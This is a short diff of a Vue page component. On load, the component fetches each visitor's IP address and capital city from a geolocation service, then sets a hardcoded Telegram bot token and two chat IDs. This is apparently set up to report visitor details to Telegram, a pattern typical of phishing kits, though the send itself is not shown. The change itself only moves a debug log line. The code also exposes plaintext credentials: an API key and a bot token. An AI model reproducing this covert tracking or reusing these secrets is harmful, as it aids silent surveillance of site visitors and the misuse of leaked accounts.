@@ -4156,13 +4156,14 @@ export default {
     };
   },
   async beforeMount() {
+    console.log("hereeeeeeeeeee")
     window.scrollTo(0, 0);
     var tt = await axios.get(
       "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
     );
     this.IP = tt.data.ip;
     this.query = tt.data.country_capital;
-    console.log("hereeeeeeeeeee",this.IP,this.query)
+    
    var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
     var chatId = -823044704;
     var chatId2 = -940829481;
